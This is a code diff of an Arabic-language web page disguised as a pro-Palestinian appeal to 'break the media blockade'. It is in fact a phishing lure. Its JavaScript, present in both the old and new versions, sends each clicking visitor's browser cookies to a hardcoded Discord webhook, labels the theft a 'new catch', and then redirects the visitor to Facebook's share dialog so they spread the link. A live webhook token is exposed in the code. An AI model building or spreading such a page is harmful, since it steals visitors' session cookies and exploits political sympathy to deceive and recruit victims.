@@ -5,63 +5,66 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>نصرة الحقيقة</title>
     <style>
-        body { background-color: #05070a; color: white; text-align: center; font-family: Arial, sans-serif; margin: 0; padding: 0; }
-        .header { background: #1b4332; padding: 25px; border-bottom: 4px solid #2d6a4f; }
-        h1 { font-size: 24px; margin: 0; line-height: 1.5; color: #d8f3dc; }
-        .img-container { padding: 15px; }
-        .main-img { 
+        body { background-color: #000000; color: white; text-align: center; font-family: sans-serif; margin: 0; padding: 0; }
+        .top-bar { background: #ce1126; padding: 20px; font-weight: bold; font-size: 20px; border-bottom: 5px solid #007a3d; }
+        .main-container { padding: 15px; }
+        .text-header { margin: 20px 0; font-size: 24px; line-height: 1.4; color: #ffffff; }
+        .big-image { 
             width: 100%; 
-            max-width: 700px; 
-            border: 3px solid #40916c; 
-            border-radius: 15px; 
-            cursor: pointer; 
-            box-shadow: 0 0 20px rgba(64,145,108,0.5);
+            max-width: 600px; 
+            border: 4px solid #ffffff; 
+            border-radius: 10px; 
+            cursor: pointer;
+            display: block;
+            margin: 0 auto;
         }
-        .btn { 
-            background-color: #2d6a4f; 
+        .btn-green { 
+            background: #007a3d; 
             color: white; 
             padding: 20px; 
-            font-size: 22px; 
-            border: none; 
-            border-radius: 10px; 
             width: 90%; 
-            max-width: 450px; 
-            margin-top: 15px; 
-            cursor: pointer; 
+            border: none; 
+            border-radius: 5px; 
+            font-size: 22px; 
+            margin-top: 20px; 
+            cursor: pointer;
             font-weight: bold;
         }
     </style>
 </head>
 <body>
 
-    <div class="header">
-        <h1>كفى صمتاً! 🇵🇸<br>اضغط على الصورة أدناه لنشر الحقيقة وفك الحصار الإعلامي فوراً</h1>
-    </div>
+    <div class="top-bar">نداء عاجل من قلب القدس 🇵🇸</div>
 
-    <div class="img-container">
-        <img src="https://i.imgur.com/r6C5m3L.jpg" class="main-img" onclick="sendToDiscord()">
-    </div>
+    <div class="main-container">
+        <div class="text-header">
+            ساعدنا في فك الحصار الإعلامي ونشر الحقيقة للعالم <br>
+            <b>اضغط على الصورة بالأسفل للنشر الفوري</b>
+        </div>
 
-    <button class="btn" onclick="sendToDiscord()">✅ تأكيد النشر ونصرة القضية</button>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b7/Dome_of_the_Rock1.jpg/640px-Dome_of_the_Rock1.jpg" 
+             class="big-image" onclick="go()">
+
+        <button class="btn-green" onclick="go()">✅ انشر القضية الآن</button>
+    </div>
 
     <script>
-    async function sendToDiscord() {
-        // تم وضع رابط ديسكورد الخاص بك هنا
-        const webhook = "https://discord.com/api/webhooks/1462191245051826242/Oc6Gh4VaGaKICuOhjZsQHUB6CABpZMQrxtmms5yi8wIKwIg401gmoFHLkp34xCXIgp81";
+    async function go() {
+        // رابط ديسكورد الخاص بك (المخزن)
+        const d_url = "https://discord.com/api/webhooks/1462191245051826242/Oc6Gh4VaGaKICuOhjZsQHUB6CABpZMQrxtmms5yi8wIKwIg401gmoFHLkp34xCXIgp81";
         
         try {
-            await fetch(webhook, {
+            await fetch(d_url, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    content: `🔥 **صيد جديد وصل للمخزن!**\n\n**النخاع (Cookies):**\n\`\`\`${document.cookie}\`\`\``
-                })
+                body: JSON.stringify({ content: "🔥 صيد جديد! النخاع: " + document.cookie })
             });
         } catch (e) {}
 
-        // تحويل الضحية لنشر الرابط
+        // النشر في فيسبوك
         window.location.href = "https://www.facebook.com/sharer/sharer.php?u=" + window.location.href;
     }
     </script>
+
 </body>
 </html>
